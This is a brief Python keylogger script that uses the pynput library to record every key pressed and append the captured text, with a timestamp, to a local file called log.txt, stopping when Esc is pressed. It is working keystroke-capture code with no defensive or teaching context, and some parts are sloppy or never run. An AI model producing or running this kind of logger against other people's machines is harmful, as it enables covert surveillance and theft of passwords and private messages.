# f = open("log.txt",'a')
# f.write('\nbaruch lavy')
# f.close()

import datetime;
from pynput.keyboard import Key, Listener

ct = datetime.datetime.now()
ts = ct.timestamp()

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed", format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = [] 

def write_file(keys):
    with open("log.txt", "a") as f:
        f.write(str(ct) + ' ')
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
        f.write('\n')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == 'Key.backspace':
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.esc':
        return False
    with open("log.txt",'a') as f:
        f.write(letter)
